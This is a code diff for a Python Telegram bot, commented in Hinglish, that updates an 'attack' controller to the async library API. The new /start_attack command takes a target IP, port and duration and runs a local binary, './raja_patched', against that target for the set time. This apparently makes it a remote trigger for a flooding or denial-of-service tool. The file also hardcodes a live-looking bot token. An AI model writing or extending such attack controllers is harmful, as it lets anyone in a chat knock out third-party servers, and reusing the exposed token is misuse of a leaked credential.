@@ -1,10 +1,10 @@
 import subprocess
-import time
+import asyncio
 from telegram import Update
-from telegram.ext import Updater, CommandHandler, CallbackContext
+from telegram.ext import Application, CommandHandler, ContextTypes
 
-# ✅ Yahan apna Telegram Bot Token daal
-BOT_TOKEN = "7992226765:AAGjm1bRrt_lgpA6JlNBJmxLNofu8CYXX8E"  
+# ✅ Apna Telegram Bot Token yahan daal
+BOT_TOKEN = "7992226765:AAGjm1bRrt_lgpA6JlNBJmxLNofu8CYXX8E"
 
 # ✅ Teri binary ka path
 BINARY_PATH = "./raja_patched"
@@ -13,49 +13,50 @@ BINARY_PATH = "./raja_patched"
 running_process = None
 
 # ✅ Attack start karne ka function
-def start_attack(update: Update, context: CallbackContext):
+async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global running_process
-    
-    if len(context.args) == 0:
-        update.message.reply_text("Usage: /start_attack <time_in_min>")
+
+    if len(context.args) < 3:
+        await update.message.reply_text("❌ Usage: /start_attack <IP> <PORT> <TIME_IN_MIN>")
         return
+
+    target_ip = context.args[0]
+    target_port = context.args[1]
     
     try:
-        duration = int(context.args[0]) * 60
-        update.message.reply_text(f"🔥 Attack started for {context.args[0]} minutes!")
+        duration = int(context.args[2]) * 60
+        await update.message.reply_text(f"🔥 Attack started on {target_ip}:{target_port} for {context.args[2]} minutes!")
 
-        # ✅ Binary execute karna
-        running_process = subprocess.Popen([BINARY_PATH])
-        
+        # ✅ Binary execute karna (IP + PORT ke saath)
+        running_process = subprocess.Popen([BINARY_PATH, target_ip, target_port])
+
         # ✅ Diye gaye time tak wait karna, phir stop karna
-        time.sleep(duration)
+        await asyncio.sleep(duration)
         if running_process:
             running_process.terminate()
-            update.message.reply_text("✅ Attack stopped automatically!")
+            await update.message.reply_text(f"✅ Attack on {target_ip}:{target_port} stopped automatically!")
             running_process = None
     except ValueError:
-        update.message.reply_text("❌ Invalid time format! Example: /start_attack 5")
+        await update.message.reply_text("❌ Invalid format! Example: /start_attack 192.168.1.1 80 5")
 
 # ✅ Attack stop karne ka function
-def stop_attack(update: Update, context: CallbackContext):
+async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global running_process
     if running_process:
         running_process.terminate()
-        update.message.reply_text("⛔ Attack stopped manually!")
+        await update.message.reply_text("⛔ Attack stopped manually!")
         running_process = None
     else:
-        update.message.reply_text("❌ No attack is running!")
+        await update.message.reply_text("❌ No attack is running!")
 
 # ✅ Bot setup karna
 def main():
-    updater = Updater(BOT_TOKEN, use_context=True)
-    dp = updater.dispatcher
-    
-    dp.add_handler(CommandHandler("start_attack", start_attack, pass_args=True))
-    dp.add_handler(CommandHandler("stop_attack", stop_attack))
+    app = Application.builder().token(BOT_TOKEN).build()
 
-    updater.start_polling()
-    updater.idle()
+    app.add_handler(CommandHandler("start_attack", start_attack))
+    app.add_handler(CommandHandler("stop_attack", stop_attack))
+
+    app.run_polling()
 
 if __name__ == "__main__":
     main()
